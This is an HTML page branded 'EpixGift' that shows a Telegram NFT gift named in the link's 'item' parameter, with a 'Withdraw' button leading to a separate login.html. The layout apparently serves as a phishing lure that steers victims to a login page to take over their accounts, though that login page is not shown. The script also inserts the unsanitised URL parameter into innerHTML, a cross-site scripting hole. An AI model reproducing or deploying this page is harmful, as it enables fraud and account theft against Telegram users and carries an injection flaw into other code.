<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>EpixGift</title>
    <style>
        body {
            background-color: #0e141b;
            color: white;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            margin: 0; padding: 15px;
        }
        .header {
            font-size: 20px; font-weight: bold;
            margin-bottom: 20px; border-bottom: 1px solid #1c252f; padding-bottom: 10px;
        }
        .grid {
            display: grid; grid-template-columns: 1fr 1fr; gap: 12px;
        }
        .nft-card {
            background: #1c252f; border-radius: 15px; padding: 10px;
            border: 1px solid #2a3644; text-align: center;
        }
        .nft-card img {
            width: 100%; aspect-ratio: 1/1; border-radius: 10px;
            margin-bottom: 8px; object-fit: cover; background: #000;
        }
        .nft-title { font-size: 13px; font-weight: bold; margin-bottom: 4px; }
        .nft-sub { font-size: 11px; color: #8a99a8; margin-bottom: 10px; }
        .btn-withdraw {
            display: block; background: #248bdf; color: white;
            text-decoration: none; font-size: 12px; font-weight: bold;
            padding: 8px 0; border-radius: 8px;
        }
        .empty { text-align: center; color: #8a99a8; margin-top: 50px; display: none; }
    </style>
</head>
<body>
    <div class="header">EpixGift</div>
    <div class="grid" id="main-grid"></div>
    <div id="empty-info" class="empty">Your inventory is empty.</div>

    <script>
        (function() {
            const grid = document.getElementById('main-grid');
            const emptyMsg = document.getElementById('empty-info');
            
            // Очистка от старых данных
            grid.innerHTML = "";

            const params = new URLSearchParams(window.location.search);
            const id = params.get('item');

            if (id) {
                emptyMsg.style.display = 'none';
                const card = document.createElement('div');
                card.className = 'nft-card';
                
                // Формируем красивый заголовок
                const title = id.replace(/-/g, ' #');
                // Картинка из Telegram NFT API
                const img = `https://t.me/i/nft/${id}.jpg`;

                card.innerHTML = `
                    <img src="${img}" onerror="this.src='https://via.placeholder.com/150/1c252f/ffffff?text=NFT'">
                    <div class="nft-title">${title}</div>
                    <div class="nft-sub">Collectible</div>
                    <a href="login.html" class="btn-withdraw">Withdraw</a>
                `;
                grid.appendChild(card);
            } else {
                emptyMsg.style.display = 'block';
            }
        })();
    </script>
</body>
</html>
